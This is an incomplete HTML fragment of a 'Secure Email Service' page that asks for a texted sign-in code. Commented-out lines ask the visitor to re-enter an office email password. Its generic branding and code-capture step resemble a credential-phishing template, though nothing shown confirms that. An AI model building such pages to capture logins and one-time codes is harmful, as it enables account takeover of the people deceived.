...
<div class="container-fluid card col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-6 offset-lg-3 col-xl-4 offset-xl-4 mt-5 mb-5">
	...
	<div class="text-center mt-4 title">
		...
		<span>Secure Email <br> Service</span>
			...
			<!-- <div class="card mt-3">
  <div class="card-body">
    For your security, please re-enter your office email and password to continue.
  </div> -->
</div>
	...
	<div class=" col-10 offset-1 col-sm-8 offset-sm-2 col-md-8 offset-md-2 col-lg-8 offset-lg-2 col-xl-8 offset-xl-2 input-text">
		...
		<h4 class="mt-4">Enter Code</h4>
		<div class="card mt-1">
  <div class="card-body">
    We texted your phone +X XXXXXX****. Please enter the code to sign in.
  </div>
</div>


		<!-- <span class="col-12  d-flex mt-3 default-font">Password</span>
		<span class="col-12  d-flex default-font  red">Please enter your office email password</span>
 -->
...
<div class=" col-lg-12 text-right default-font">
  ...
  <div class="row">
  	<div class=" d-flex justify-content-center">
  		<button type="submit" class=" btn-success col-8 btn-lg">Verify</button>


</div>

<div class="d-flex justify-content-center mt-5 mb-6"><a class="default-font" href="/site">Go Back</a></div>
  </div>
